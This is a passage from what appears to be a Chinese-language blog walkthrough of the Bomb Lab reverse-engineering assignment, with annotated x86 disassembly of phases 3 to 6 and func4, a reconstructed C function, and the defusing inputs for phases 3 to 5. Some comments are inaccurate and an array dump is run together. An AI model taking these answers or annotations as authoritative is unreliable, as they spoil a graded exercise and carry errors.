//跳转到cfd,那里比较b和6f的大小</span><br><span class="line"> 8048c87:b8 7a 00 00 00       mov    $0x7a,%eax //eax=7a</span><br><span class="line"> 8048c8c:81 7c 24 28 92 01 00 cmpl   $0x192,0x28(%esp) //比较a和192大小</span><br><span class="line"> 8048c93:00 </span><br><span class="line"> 8048c94:74 67                je     8048cfd &lt;phase_3+0x141&gt; //相等跳转到cfd,那里比较b和7a的大小</span><br><span class="line"> 8048c96:e8 1b 05 00 00       call   80491b6 &lt;explode_bomb&gt;//不相等爆</span><br><span class="line"> 8048c9b:b8 7a 00 00 00       mov    $0x7a,%eax</span><br><span class="line"> 8048ca0:eb 5b                jmp    8048cfd &lt;phase_3+0x141&gt;</span><br><span class="line"> 8048ca2:b8 61 00 00 00       mov    $0x61,%eax</span><br><span class="line"> 8048ca7:81 7c 24 28 8e 03 00 cmpl   $0x38e,0x28(%esp)</span><br><span class="line"> 8048cae:00 </span><br><span class="line"> 8048caf:74 4c                je     8048cfd &lt;phase_3+0x141&gt;</span><br><span class="line"> 8048cb1:e8 00 05 00 00       call   80491b6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048cb6:b8 61 00 00 00       mov    $0x61,%eax</span><br><span class="line"> 8048cbb:eb 40                jmp    8048cfd &lt;phase_3+0x141&gt;</span><br><span class="line"> 8048cbd:b8 65 00 00 00       mov    $0x65,%eax</span><br><span class="line"> 8048cc2:81 7c 24 28 73 02 00 cmpl   $0x273,0x28(%esp)</span><br><span class="line"> 8048cc9:00 </span><br><span class="line"> 8048cca:74 31                je     8048cfd &lt;phase_3+0x141&gt;</span><br><span class="line"> 8048ccc:e8 e5 04 00 00       call   80491b6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048cd1:b8 65 00 00 00       mov    $0x65,%eax</span><br><span class="line"> 8048cd6:eb 25                jmp    8048cfd &lt;phase_3+0x141&gt;</span><br><span class="line"> 8048cd8:b8 79 00 00 00       mov    $0x79,%eax</span><br><span class="line"> 8048cdd:81 7c 24 28 ad 03 00 cmpl   $0x3ad,0x28(%esp)</span><br><span class="line"> 8048ce4:00 </span><br><span class="line"> 8048ce5:74 16                je     8048cfd &lt;phase_3+0x141&gt;</span><br><span class="line"> 8048ce7:e8 ca 04 00 00       call   80491b6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048cec:b8 79 00 00 00       mov    $0x79,%eax</span><br><span class="line"> 8048cf1:eb 0a                jmp    8048cfd &lt;phase_3+0x141&gt;</span><br><span class="line"> 8048cf3:e8 be 04 00 00       call   80491b6 &lt;explode_bomb&gt; //爆炸，</span><br><span class="line">/*</span><br><span class="line">上面执行的代码大同小异，a必须要等于67\52\73\10b\192\38e\273\3ad这其中的值</span><br><span class="line">分别对应b和66\76\64\6f\7a\61\65\79作比较</span><br><span class="line">否则</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"> 8048cf8:b8 62 00 00 00       mov    $0x62,%eax</span><br><span class="line"> 8048cfd:3a 44 24 2f          cmp    0x2f(%esp),%al</span><br><span class="line"> 8048d01:74 05                je     8048d08 &lt;phase_3+0x14c&gt;  //如果b等于对应eax，那么就跳转</span><br><span class="line"> 8048d03:e8 ae 04 00 00       call   80491b6 &lt;explode_bomb&gt; //不相等就爆炸，也就是必须相等</span><br><span class="line"> 8048d08:83 c4 3c             add    $0x3c,%esp //d的值(esp+40)再加上0x3c</span><br><span class="line"> 8048d0b:c3                   ret    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时存放的情况应该如下</p><p>图一：</p><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240419210211585.png" alt="image-20240419210211585"></p><p>根据上面的分析：</p><ol><li>密码的排列应该为输入的三个参数的顺序，即<code>c b a</code></li><li>c有八种情况，对应的答案应该是一个<code>3*8</code>的矩阵</li><li>根据这八种情况来列出答案</li></ol><p>a必须要等于67\52\73\10b\192\38e\273\3ad这其中的值<br>分别对应b和66\76\64\6f\7a\61\65\79作比较且必须相等</p><p><strong>顺序为c b a</strong></p><table><thead><tr><th>c</th><th>a</th><th>b</th></tr></thead><tbody><tr><td>0</td><td>103</td><td>f</td></tr><tr><td>1</td><td>82</td><td>v</td></tr><tr><td>2</td><td>115</td><td>d</td></tr><tr><td>3</td><td>267</td><td>o</td></tr><tr><td>4</td><td>402</td><td>z</td></tr><tr><td>5</td><td>910</td><td>a</td></tr><tr><td>6</td><td>627</td><td>e</td></tr><tr><td>7</td><td>941</td><td>y</td></tr></tbody></table><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240419214923670.png" alt="image-20240419214923670"></p><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">08048d0c &lt;func4&gt;:</span><br><span class="line"> 8048d0c:83 ec 1c             sub    $0x1c,%esp   //这里的栈与原先的栈不同，esp也不同</span><br><span class="line"> 8048d0f:89 5c 24 14          mov    %ebx,0x14(%esp)   //esp+14=ebx</span><br><span class="line"> 8048d13:89 74 24 18          mov    %esi,0x18(%esp) //esp+18=esi</span><br><span class="line"> 8048d17:8b 54 24 20          mov    0x20(%esp),%edx  //edx=esp+20=A</span><br><span class="line"> 8048d1b:8b 44 24 24          mov    0x24(%esp),%eax  //eax=esp+24=B</span><br><span class="line"> 8048d1f:8b 5c 24 28          mov    0x28(%esp),%ebx  //ebx=esp+28=C</span><br><span class="line"> 8048d23:89 d9                mov    %ebx,%ecx  //ecx=ebx=C</span><br><span class="line"> 8048d25:29 c1                sub    %eax,%ecx  //C=C-B</span><br><span class="line"> 8048d27:89 ce                mov    %ecx,%esi  //esi=C-B</span><br><span class="line"> 8048d29:c1 ee 1f             shr    $0x1f,%esi //将esi即C-B右移1f位</span><br><span class="line"> 8048d2c:01 f1                add    %esi,%ecx  //ecx=C-B+(C-B)&gt;&gt;1f</span><br><span class="line"> 8048d2e:d1 f9                sar    %ecx  //ecx=ecx/2=((c-b)+(C-B)&gt;&gt;1f)/2</span><br><span class="line"> 8048d30:01 c1                add    %eax,%ecx //ecx=ecx+B ((c-b)+(C-B)&gt;&gt;1f)/2+B</span><br><span class="line"> 8048d32:39 d1                cmp    %edx,%ecx //比较ecx和A的大小 </span><br><span class="line"> 8048d34:7e 17                jle    8048d4d &lt;func4+0x41&gt; //如果A&lt;=ecx，跳转到d4d</span><br><span class="line"> 8048d36:83 e9 01             sub    $0x1,%ecx //如果A&gt;ecx,ecx-1</span><br><span class="line"> 8048d39:89 4c 24 08          mov    %ecx,0x8(%esp) //esp+8=ecx</span><br><span class="line"> 8048d3d:89 44 24 04          mov    %eax,0x4(%esp) //esp+4=B</span><br><span class="line"> 8048d41:89 14 24             mov    %edx,(%esp)  //esp=edx=A</span><br><span class="line"> 8048d44:e8 c3 ff ff ff       call   8048d0c &lt;func4&gt; //递归下一层 fun(A,B,((c-b)+(C-B)&gt;&gt;1f)/2+B-1)</span><br><span class="line"> 8048d49:01 c0                add    %eax,%eax //eax=2B</span><br><span class="line"> 8048d4b:eb 20                jmp    8048d6d &lt;func4+0x61&gt; //跳转到d6d</span><br><span class="line"> 8048d4d:b8 00 00 00 00       mov    $0x0,%eax  //上面说到A&lt;=ecx,这里将eax赋0</span><br><span class="line"> 8048d52:39 d1                cmp    %edx,%ecx  //如果A&gt;=ecx</span><br><span class="line"> 8048d54:7d 17                jge    8048d6d &lt;func4+0x61&gt;  //跳转到d6d，跳出</span><br><span class="line"> 8048d56:89 5c 24 08          mov    %ebx,0x8(%esp) //esp+8=C</span><br><span class="line"> 8048d5a:83 c1 01             add    $0x1,%ecx  //ecx=ecx+1</span><br><span class="line"> 8048d5d:89 4c 24 04          mov    %ecx,0x4(%esp) //esp+4=ecx</span><br><span class="line"> 8048d61:89 14 24             mov    %edx,(%esp)  //esp=A</span><br><span class="line"> 8048d64:e8 a3 ff ff ff       call   8048d0c &lt;func4&gt; //fun(A,x,C)</span><br><span class="line"> 8048d69:8d 44 00 01          lea    0x1(%eax,%eax,1),%eax    /2res+1</span><br><span class="line"> 8048d6d:8b 5c 24 14          mov    0x14(%esp),%ebx  //上面说到A&lt;=ecx并且B&gt;=ecx,就跳转到这里，跳出函数</span><br><span class="line"> 8048d71:8b 74 24 18          mov    0x18(%esp),%esi  </span><br><span class="line"> 8048d75:83 c4 1c             add    $0x1c,%esp</span><br><span class="line"> 8048d78:c3                   ret    </span><br><span class="line"></span><br><span class="line">08048d79 &lt;phase_4&gt;:</span><br><span class="line"> 8048d79:83 ec 2c             sub    $0x2c,%esp  //esp减去2c</span><br><span class="line"> 8048d7c:8d 44 24 1c          lea    0x1c(%esp),%eax  //eax=esp+1c=a </span><br><span class="line"> 8048d80:89 44 24 0c          mov    %eax,0xc(%esp) //esp+c=eax=a</span><br><span class="line"> 8048d84:8d 44 24 18          lea    0x18(%esp),%eax  //eax=esp+18=b</span><br><span class="line"> 8048d88:89 44 24 08          mov    %eax,0x8(%esp)  //esp+8=eax=b</span><br><span class="line"> 8048d8c:c7 44 24 04 a3 a4 04 movl   $0x804a4a3,0x4(%esp)  //esp+4=这个立即数</span><br><span class="line"> 8048d93:08 </span><br><span class="line"> 8048d94:8b 44 24 30          mov    0x30(%esp),%eax  //eax=esp+30=c</span><br><span class="line"> 8048d98:89 04 24             mov    %eax,(%esp)  //esp=c</span><br><span class="line"> 8048d9b:e8 d0 fa ff ff       call   8048870 &lt;__isoc99_sscanf@plt&gt; //输入几个参数，也就是b,a</span><br><span class="line"> 8048da0:83 f8 02             cmp    $0x2,%eax  //比较eax和2，判断输入是否完成</span><br><span class="line"> 8048da3:75 0d                jne    8048db2 &lt;phase_4+0x39&gt; //输入未完成跳转到db2，也就是爆炸 </span><br><span class="line"> 8048da5:8b 44 24 18          mov    0x18(%esp),%eax   //eax=esp+18=b</span><br><span class="line"> 8048da9:85 c0                test   %eax,%eax  //eax是否为0</span><br><span class="line"> 8048dab:78 05                js     8048db2 &lt;phase_4+0x39&gt;  //SF为1，eax为0时跳转到爆炸</span><br><span class="line"> 8048dad:83 f8 0e             cmp    $0xe,%eax //比较eax和e</span><br><span class="line"> 8048db0:7e 05                jle    8048db7 &lt;phase_4+0x3e&gt;  //如果eax&lt;=e,跳转到db7</span><br><span class="line"> 8048db2:e8 ff 03 00 00       call   80491b6 &lt;explode_bomb&gt; //如果大于e，就爆炸，也就是eax必须小于等于e，也就是b必须小于等于e</span><br><span class="line"> 8048db7:c7 44 24 08 0e 00 00 movl   $0xe,0x8(%esp)  //前面提到eax&lt;=e,那么b就设置为e</span><br><span class="line"> 8048dbe:00 </span><br><span class="line"> 8048dbf:c7 44 24 04 00 00 00 movl   $0x0,0x4(%esp)  //esp+4置为0</span><br><span class="line"> 8048dc6:00 </span><br><span class="line"> 8048dc7:8b 44 24 18          mov    0x18(%esp),%eax  //eax=原先b的值</span><br><span class="line"> 8048dcb:89 04 24             mov    %eax,(%esp) //esp=源b</span><br><span class="line"> 8048dce:e8 39 ff ff ff       call   8048d0c &lt;func4&gt;  //调用func4，三个参数分别为b，0，e</span><br><span class="line"> 8048dd3:85 c0                test   %eax,%eax //判断返回值是否为0</span><br><span class="line"> 8048dd5:75 07                jne    8048dde &lt;phase_4+0x65&gt;  //不为0，就跳转到dde，就是爆炸</span><br><span class="line"> 8048dd7:83 7c 24 1c 00       cmpl   $0x0,0x1c(%esp) //也就是返回值必须等于0，比较a和0的值</span><br><span class="line"> 8048ddc:74 05                je     8048de3 &lt;phase_4+0x6a&gt; //如果a=0.那么就跳转到de3，跳出</span><br><span class="line"> 8048dde:e8 d3 03 00 00       call   80491b6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048de3:83 c4 2c             add    $0x2c,%esp</span><br><span class="line"> 8048de6:c3                   ret    </span><br></pre></td></tr></table></figure><p>func可能的c语言代码</p><p>（b，0，e）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func4</span><span class="params">(<span class="type">int</span> A, <span class="type">int</span> B, <span class="type">int</span> C)</span> &#123;</span><br><span class="line">    <span class="type">int</span> result = (C - B + ((C - B) &gt;&gt; <span class="number">0x1F</span>)) / <span class="number">2</span>;  <span class="comment">// ((C - B + ((C - B) &gt;&gt; 0x1F)) / 2) + B</span></span><br><span class="line">    result += B;</span><br><span class="line">    <span class="keyword">if</span> (result &lt;= A) &#123;</span><br><span class="line">        <span class="keyword">if</span>(A &gt; result) &#123;</span><br><span class="line">            result = func4(A, result+<span class="number">1</span>, C);</span><br><span class="line">            result = <span class="number">2</span> * result + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = <span class="number">0</span>; <span class="comment">// when A = result</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result = func4(A, B, result<span class="number">-1</span>); <span class="comment">// A &gt; result</span></span><br><span class="line">        result = <span class="number">2</span> * result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是result最后必须为0跳出，可得A参数即b的值应该是0，</p><p>根据<code>  cmpl   $0x0,0x1c(%esp) //也就是返回值必须等于0，比较a和0的值</code></p><p>又可以得出参数a的值也为0。</p><p>密码应该是0，0；</p><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240422220303281.png" alt="image-20240422220303281"></p><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">08048de7 &lt;phase_5&gt;:</span><br><span class="line"> 8048de7:83 ec 2c             sub    $0x2c,%esp    //开辟栈空间</span><br><span class="line"> 8048dea:8d 44 24 1c          lea    0x1c(%esp),%eax //eax=esp+1c=a</span><br><span class="line"> 8048dee:89 44 24 0c          mov    %eax,0xc(%esp)//esp+c=esp+1c</span><br><span class="line"> 8048df2:8d 44 24 18          lea    0x18(%esp),%eax//eax=esp+18</span><br><span class="line"> 8048df6:89 44 24 08          mov    %eax,0x8(%esp)//esp+8=eax=esp+18=b</span><br><span class="line"> 8048dfa:c7 44 24 04 a3 a4 04 movl   $0x804a4a3,0x4(%esp) //存入这个立即数</span><br><span class="line"> 8048e01:08 </span><br><span class="line"> 8048e02:8b 44 24 30          mov    0x30(%esp),%eax</span><br><span class="line"> 8048e06:89 04 24             mov    %eax,(%esp)</span><br><span class="line"> 8048e09:e8 62 fa ff ff       call   8048870 &lt;__isoc99_sscanf@plt&gt;  //这里进行输入操作并判断输入是否完成</span><br><span class="line"> 8048e0e:83 f8 01             cmp    $0x1,%eax</span><br><span class="line"> 8048e11:7f 05                jg     8048e18 &lt;phase_5+0x31&gt;//这里表明至少输入了2个数</span><br><span class="line"> 8048e13:e8 9e 03 00 00       call   80491b6 &lt;explode_bomb&gt;//输入未完成就爆炸</span><br><span class="line"> 8048e18:8b 44 24 18          mov    0x18(%esp),%eax//eax=esp+18=b</span><br><span class="line"> 8048e1c:83 e0 0f             and    $0xf,%eax//eax=eax&amp;f=b&amp;0xf</span><br><span class="line"> 8048e1f:89 44 24 18          mov    %eax,0x18(%esp) //将得到的与结果num1存入原b的位置</span><br><span class="line"> 8048e23:83 f8 0f             cmp    $0xf,%eax//eax与num1比较</span><br><span class="line"> 8048e26:74 2a                je     8048e52 &lt;phase_5+0x6b&gt;//如果num1==0xf</span><br><span class="line"> 8048e28:b9 00 00 00 00       mov    $0x0,%ecx//ecx=0</span><br><span class="line"> 8048e2d:ba 00 00 00 00       mov    $0x0,%edx//edx=0</span><br><span class="line"> 8048e32:83 c2 01             add    $0x1,%edx//edx++ -&gt;edx=1</span><br><span class="line"> 8048e35:8b 04 85 00 a3 04 08 mov    0x804a300(,%eax,4),%eax//eax=804a300+4*eax</span><br><span class="line"> 8048e3c:01 c1                add    %eax,%ecx//ecx=eax+0=804a300+4*num1</span><br><span class="line"> 8048e3e:83 f8 0f             cmp    $0xf,%eax//eax和f比较</span><br><span class="line"> 8048e41:75 ef                jne    8048e32 &lt;phase_5+0x4b&gt;</span><br><span class="line"> /*</span><br><span class="line"> 如果eax和f不相等，跳转到e32,这里表明他进入了一个循环，</span><br><span class="line"> 因此eax结束时，他的值应该是15</span><br><span class="line"> */</span><br><span class="line"> 8048e43:89 44 24 18          mov    %eax,0x18(%esp)//原来b的位置放入eax的值</span><br><span class="line"> 8048e47:83 fa 0f             cmp    $0xf,%edx//edx和f比较</span><br><span class="line"> 8048e4a:75 06                jne    8048e52 &lt;phase_5+0x6b&gt;//如果edx不等于f，跳转到爆炸，</span><br><span class="line"> 8048e4c:3b 4c 24 1c          cmp    0x1c(%esp),%ecx//比较a和ecx的值</span><br><span class="line"> 8048e50:74 05                je     8048e57 &lt;phase_5+0x70&gt;//如果相等跳转e57，跳出</span><br><span class="line"> 8048e52:e8 5f 03 00 00       call   80491b6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048e57:83 c4 2c             add    $0x2c,%esp//跳出</span><br><span class="line"> 8048e5a:c3                   ret    </span><br></pre></td></tr></table></figure><p>这里最主要的是循环结构，根据对汇编代码的分析，可以发现这个循环进行的次数为15，并且最终eax中存放的值应该为15，每次eax的值都符合</p><p><code>eax=arr[eax]</code>；</p><p>最终参数a的值应该是所有数组arr的值相加，由循环后的代码可得</p><p>而参数b的值对应的是arr数组的初始值，或者说是开始循环时arr[b]中的b；</p><p>这需要根据arr[n]&#x3D;15和gdb来得到</p><p>使用gdb指令：<code>x/16dh 0x804a300</code>来查看数组中的每个数据</p><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240422115323390.png" alt="image-20240422115323390"></p><p>所以arr数组为：</p><p>0x804a300 &lt;array.2957&gt;:   102147<br>0x804a310 &lt;array.2957+16&gt;:8121511<br>0x804a320 &lt;array.2957+32&gt;:04113<br>0x804a330 &lt;array.2957+48&gt;:3965</p><p>那么 <code>arr[6]=15</code> </p><p>arr[14]&#x3D;6;</p><p>arr[2]&#x3D;14;</p><p>arr[1]&#x3D;2;</p><p>arr[10]&#x3D;1;</p><p>arr[0]&#x3D;10;</p><p>arr[8]&#x3D;0;</p><p>arr[4]&#x3D;8;</p><p>arr[9]&#x3D;4;</p><p>arr[13]&#x3D;9;</p><p>arr[11]&#x3D;13;</p><p>arr[7]&#x3D;11;</p><p>arr[3]&#x3D;7;</p><p>arr[12]&#x3D;3;</p><p>arr[5]&#x3D;12;</p><p>所以最终可以得到b&#x3D;5;a&#x3D;115；</p><p>密码应该是5,115;</p><p><img src="/../images/Bomb%E5%AE%9E%E9%AA%8C/image-20240422220322775.png" alt="image-20240422220322775"></p><h3 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">08048e5b &lt;phase_6&gt;:</span><br><span class="line"> 8048e5b:56                   push   %esi</span><br><span class="line"> 8048e5c:53                   push   %ebx</span><br><span class="line"> 8048e5d:83 ec 44             sub    $0x44,%esp</span><br><span class="line"> /*</span><br><span class="line"> 保存源基址并开辟新的内存空间</span><br><span class="line"> */</span><br><span class="line"> 8048e60:8d 44 24 10          lea    0x10(%esp),%eax</span><br><span class="line"> 8048e64:89 44 24 04          mov    %eax,0x4(%esp)</span><br><span class="line"> /*</span><br><span class="line"> esp+4的位置放上esp+10=a</span><br><span class="line"> */</span><br><span class="line"> 8048e68:8b 44 24 50          mov    0x50(%esp),%eax</span><br><span class="line"> 8048e6c:89 04 24             mov    %eax,(%esp)//esp的位置放上esp+50=b</span><br><span class="line"> 8048e6f:e8 77 04 00 00       call   80492eb &lt;read_six_numbers&gt;   //这里读六个数字</span><br><span class="line"> 8048e74:be 00 00 00 00       mov    $0x0,%esi</span><br><span class="line"> 8048e79:8b 44 b4 10          mov    0x10(%esp,%esi,4),%eax//eax=4*0+esp+10=esp+10=10+b，esi为0表示6个数中的第0个</span><br><span class="line"> 8048e7d:83 e8 01             sub    $0x1,%eax//eax-=1-&gt; eax=(esp+10)-1;</span><br><span class="line"> 8048e80:83 f8 05             cmp    $0x5,%eax//将b和eax比较，这里表明eax的值必为1-6</span><br><span class="line"> 8048e83:76 05                jbe    8048e8a &lt;phase_6+0x2f&gt;//如果b-1&lt;=5，那么跳转到e8a</span><br><span class="line"> 8048e85:e8 2c 03 00 00       call   80491b6 &lt;explode_bomb&gt;//这里证明b-1必须&lt;=5</span><br><span class="line"> /*</span><br><span class="line"> 这里可以得出输入的数在1-6之间</span><br><span class="line"> */</span><br><span class="line"> 8048e8a:83 c6 01             add    $0x1,%esi//esi++ -&gt; esi=1`</span><br><span class="line"> 8048e8d:83 fe 06             cmp    $0x6,%esi//esi和6比较</span><br><span class="line"> 8048e90:74 1b                je     8048ead &lt;phase_6+0x52&gt;//如果等于6，跳转到ead</span><br><span class="line"> 8048e92:89 f3                mov    %esi,%ebx//如果不等于6;ebx=esi的值=1</span><br><span class="line"> 8048e94:8b 44 9c 10          mov    0x10(%esp,%ebx,4),%eax//eax=4ebx+b+10</span><br><span class="line"> 8048e98:39 44 b4 0c          cmp    %eax,0xc(%esp,%esi,4)//比较4esi+b+c(12)的值和4esi+b+10的值</span><br><span class="line"> 8048e9c:75 05                jne    8048ea3 &lt;phase_6+0x48&gt;//如果不相等，就跳转到ea3</span><br><span class="line"> 8048e9e:e8 13 03 00 00       call   80491b6 &lt;explode_bomb&gt;//如果相等，爆炸</span><br><span class="line"> 8048ea3:83 c3 01             add    $0x1,%ebx//ebx++ -&gt;esi++ebx=2</span><br><span class="line"> 8048ea6:83 fb 05             cmp    $0x5,%ebx//比较ebx和5</span><br><span class="line"> 8048ea9:7e e9                jle    8048e94 &lt;phase_6+0x39&gt;//如果ebx&lt;=5,跳转到e94,这里进入了一个循环</span><br><span class="line"> 8048eab:eb cc                jmp    8048e79 &lt;phase_6+0x1e&gt;//这里跳转到e79，进入了下一轮循环</span><br><span class="line"> 8048ead:8d 44 24 10          lea    0x10(%esp),%eax//eax=esp+10</span><br><span class="line"> 8048eb1:8d 5c 24 28          lea    0x28(%esp),%ebx//ebx=esp+28</span><br><span class="line"> </span><br><span class="line"> 8048eb5:b9 07 00 00 00       mov    $0x7,%ecx//ecx=7</span><br><span class="line"> 8048eba:89 ca                mov    %ecx,%edx//edx=ecx=7  </span><br><span class="line"> 8048ebc:2b 10                sub    (%eax),%edx//edx-=esp+10中的值</span><br><span class="line"> 8048ebe:89 10                mov    %edx,(%eax)//eax存放的地址放入edx的值即edx-=(esp+10)</span><br><span class="line"> 8048ec0:83 c0 04             add    $0x4,%eax//eax+=4=(esp+10)+4</span><br><span class="line"> 8048ec3:39 d8                cmp    %ebx,%eax//比较eax和esp+28存放的值</span><br><span class="line">  /*</span><br><span class="line"> 这里表明最终的存储的是7-x的值，对每一个元素都进行了这个操作</span><br><span class="line"> */</span><br><span class="line"> 8048ec5:75 f3                jne    8048eba &lt;phase_6+0x5f&gt;//如果这两个数字不相等，跳转到eba</span><br><span class="line"> 8048ec7:bb 00 00 00 00       mov    $0x0,%ebx//如果相等了，ebx=0</span><br><span class="line"> 8048ecc:eb 16                jmp    8048ee4 &lt;phase_6+0x89&gt;//跳转到ee4</span><br><span class="line"> 8048ece:8b 52 08             mov    0x8(%edx),%edx//edx=edx+8</span><br><span class="line"> 8048ed1:83 c0 01             add    $0x1,%eax//eax++</span><br><span class="line"> 8048ed4:39 c8                cmp    %ecx,%eax  //比较eax和ecx的值</span><br><span class="line"> 8048ed6:75 f6                jne    8048ece &lt;phase_6+0x73&gt;//如果eax不等于ecx，循环</span><br><span class="line"> 8048ed8:89 54 b4 28          mov    %edx,0x28(%esp,%esi,4)//esp+4esi+28的值等于edx</span><br><span class="line"> 8048edc:83 c3 01             add    $0x1,%ebx//ebx++</span><br><span class="line"> 8048edf:83 fb 06             cmp    $0x6,%ebx//ebx和6比较</span><br><span class="line"> 8048ee2:74 17                je     8048efb &lt;phase_6+0xa0&gt;//如果ebx=6，跳转到efb</span><br><span class="line"> 8048ee4:89 de                mov    %ebx,%esi//如果不相等esi=ebx</span><br><span class="line"> 8048ee6:8b 4c 9c 10          mov    0x10(%esp,%ebx,4),%ecx//ecx的值=4ebx+esp+10</span><br><span class="line"> 8048eea:b8 01 00 00 00       mov    $0x1,%eaxea=10</span><br><span class="line"> /*</span><br><span class="line">mov 0x8(%edx), %edx 这条指令表示遍历一个结构体或者数组中的下一个元素，即把结构体的 next 指针(通常存储在结构体成员的偏移位置 +8 的地方)放入 %edx 用于下次迭代。</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"> 8048eef:ba 3c c1 04 08       mov    $0x804c13c,%edx//edx放入这个地址</span><br><span 